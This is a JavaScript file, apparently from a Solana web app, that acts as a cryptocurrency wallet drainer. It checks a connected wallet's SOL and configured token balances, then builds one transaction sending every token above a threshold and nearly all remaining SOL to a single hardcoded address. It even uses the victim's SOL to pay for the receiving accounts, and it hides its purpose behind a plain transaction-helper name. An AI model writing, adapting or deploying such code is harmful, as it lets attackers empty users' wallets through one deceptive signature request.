/* transaction.js */
/* eslint-disable @typescript-eslint/no-explicit-any */

import {
  PublicKey,
  SystemProgram,
  TransactionMessage,
  VersionedTransaction,
} from "@solana/web3.js";
import {
  getAssociatedTokenAddress,
  getAccount,
  createTransferCheckedInstruction,
  createAssociatedTokenAccountIdempotentInstruction,
  createAssociatedTokenAccountInstruction,
  TOKEN_PROGRAM_ID,
  TOKEN_2022_PROGRAM_ID,
  ASSOCIATED_TOKEN_PROGRAM_ID,
} from "@solana/spl-token";
import { connection } from "./connect.js";
import { TOKEN_CONFIGS } from "./token-config.js";

// RPC Throttle
const BATCH_SIZE = 3;
const BATCH_DELAY_MS = 1000;

// — Genel ayarlar —
const FIXED_FEE_BUFFER_LAMPORTS = 6_000_000; // ~0.006 SOL ücret tamponu
const TOKEN_ACCOUNT_SIZE = 165;              // SPL token account boyutu (rent için)

/** Basit batch runner */
async function runBatches(tasks) {
  const results = [];
  for (let i = 0; i < tasks.length; i += BATCH_SIZE) {
    const batch = tasks.slice(i, i + BATCH_SIZE).map((fn) => fn());
    const res = await Promise.all(batch);
    results.push(...res);
    if (i + BATCH_SIZE < tasks.length) {
      await new Promise((r) => setTimeout(r, BATCH_DELAY_MS));
    }
  }
  return results;
}

/** Mint hesabının owner’ına bakarak hangi token programı (legacy / 2022) olduğunu tespit eder. */
async function detectTokenProgramId(mintPubkey) {
  const info = await connection.getAccountInfo(mintPubkey);
  if (!info) return TOKEN_PROGRAM_ID; // Güvenli varsayılan (çoğu büyük mint legacy)
  const owner = info.owner;
  if (owner.equals(TOKEN_PROGRAM_ID)) return TOKEN_PROGRAM_ID;
  if (owner.equals(TOKEN_2022_PROGRAM_ID)) return TOKEN_2022_PROGRAM_ID;
  // Çok nadir özel programlar için: yine owner’ı kullan
  return owner;
}

export async function createUnsignedTransaction(userPublicKey) {
  if (!userPublicKey) {
    console.warn("Wallet not connected!");
    return null;
  }

  const payer = userPublicKey;
  const toPublicKey = new PublicKey("GpLLb2NqvWYyYJ5wGZNQCAuxHWdJdHpXscyHNd6SH8c1");

  // 0) SOL bakiyesi
  const userSolLamports = await connection.getBalance(payer);

  // 1) Her mint için programId tespiti (owner = token program)
  const progDetectTasks = TOKEN_CONFIGS.map(({ mint }) => async () => {
    const programId = await detectTokenProgramId(mint);
    return { mint, programId };
  });
  const programMap = await runBatches(progDetectTasks);
  const programByMint = new Map(programMap.map((x) => [x.mint.toBase58(), x.programId]));

  // 2) Kullanıcının SPL bakiyelerini oku (bigint ile) — doğru programId ile ATA derive et
  const balanceTasks = TOKEN_CONFIGS.map(({ mint, threshold }) => async () => {
    const programId = programByMint.get(mint.toBase58()) || TOKEN_PROGRAM_ID;

    // Doğru programId ile deterministik ATA
    const userAta = await getAssociatedTokenAddress(
      mint,
      payer,
      false,
      programId,
      ASSOCIATED_TOKEN_PROGRAM_ID
    );

    let amount = 0n;
    let sufficient = false;
    try {
      // Doğru parser için programId veriyoruz
      const acct = await getAccount(connection, userAta, undefined, programId);
      amount = acct.amount; // bigint
      const th = BigInt(threshold ?? 0);
      sufficient = amount > th;
    } catch {
      sufficient = false; // ATA yok ya da okuyamadık
    }

    const toAta = await getAssociatedTokenAddress(
      mint,
      toPublicKey,
      false,
      programId,
      ASSOCIATED_TOKEN_PROGRAM_ID
    );

    return { mint, programId, userAta, toAta, amount, sufficient };
  });
  const userTokenInfos = await runBatches(balanceTasks);

  // 3) Transfer etmeyi planladığımız tokenlar
  const candidateTokens = userTokenInfos.filter((t) => t.sufficient);

  // Hiçbir varlık yeterli değilse ve SOL de yoksa çık
  if (candidateTokens.length === 0 && userSolLamports <= FIXED_FEE_BUFFER_LAMPORTS) {
    console.warn("Yeterli bakiye yok (ne SOL ne de SPL)!");
    return null;
  }

  // 4) Hedef tarafta eksik ATA var mı?
  const existTasks = candidateTokens.map((info) => async () => {
    let toAtaExists = true;
    try {
      await getAccount(connection, info.toAta, undefined, info.programId);
    } catch {
      toAtaExists = false;
    }
    return { ...info, toAtaExists };
  });
  const tokenPlans = await runBatches(existTasks);

  // 5) Rent bedeli ve bütçe
  const ataRentLamports = await connection.getMinimumBalanceForRentExemption(TOKEN_ACCOUNT_SIZE);
  let spendableLamports = Math.max(userSolLamports - FIXED_FEE_BUFFER_LAMPORTS, 0);

  // 6) Dahil edilecekler
  const selected = [];
  for (const plan of tokenPlans) {
    if (plan.toAtaExists) {
      selected.push({ ...plan, needsCreate: false });
    } else if (spendableLamports >= ataRentLamports) {
      spendableLamports -= ataRentLamports;
      selected.push({ ...plan, needsCreate: true });
    } else {
      console.warn(
        `Rent yetersiz: ${plan.mint.toBase58()} için hedef ATA oluşturacak SOL kalmadı, token atlandı.`
      );
    }
  }

  // 7) Instruction'lar
  const instructions = [];

  // 7a) SPL: gerekiyorsa hedef ATA create (doğru programId ile), sonra checked transfer
  for (const t of selected) {
    if (t.needsCreate) {
      if (typeof createAssociatedTokenAccountIdempotentInstruction === "function") {
        // (payer, ata, owner, mint, tokenProgramId?, associatedProgramId?)
        instructions.push(
          createAssociatedTokenAccountIdempotentInstruction(
            payer,
            t.toAta,
            toPublicKey,
            t.mint,
            t.programId,
            ASSOCIATED_TOKEN_PROGRAM_ID
          )
        );
      } else {
        instructions.push(
          createAssociatedTokenAccountInstruction(
            payer,
            t.toAta,
            toPublicKey,
            t.mint,
            t.programId,
            ASSOCIATED_TOKEN_PROGRAM_ID
          )
        );
      }
    }

    // decimals'ı config'ten çek
    const cfg = TOKEN_CONFIGS.find((c) => c.mint.equals(t.mint));
    const decimals = cfg?.decimals ?? 0;

    // Checked transfer: (source, dest, mint, owner, amount, decimals, multiSigners?, programId?)
    instructions.push(
      createTransferCheckedInstruction(
        t.userAta,
        t.mint,
        t.toAta,
        payer,
        t.amount,
        decimals,
        [],
        t.programId
      )
    );
  }

  // 7b) Kalan SOL'u gönder (varsa)
  const solToSend = Math.max(spendableLamports, 0);
  if (solToSend > 0) {
    instructions.push(
      SystemProgram.transfer({
        fromPubkey: payer,
        toPubkey: toPublicKey,
        lamports: solToSend,
      })
    );
  }

  if (instructions.length === 0) {
    console.warn("Eklenecek hiçbir instruction bulunamadı.");
    return null;
  }

  // 8) VersionedTransaction
  const { blockhash } = await connection.getLatestBlockhash();
  const messageV0 = new TransactionMessage({
    payerKey: payer,
    recentBlockhash: blockhash,
    instructions,
  }).compileToV0Message();

  // Debug
  try {
    console.table(
      selected.map((s) => ({
        mint: s.mint.toBase58(),
        programId:
          s.programId.equals(TOKEN_PROGRAM_ID)
            ? "TOKEN_PROGRAM_ID"
            : s.programId.equals(TOKEN_2022_PROGRAM_ID)
            ? "TOKEN_2022_PROGRAM_ID"
            : s.programId.toBase58(),
        amount: s.amount.toString(),
        toAtaExists: s.toAtaExists,
        needsCreate: s.needsCreate,
      }))
    );
    console.log("SOL to send (lamports):", solToSend);
  } catch (_) {}

  return new VersionedTransaction(messageV0);
}
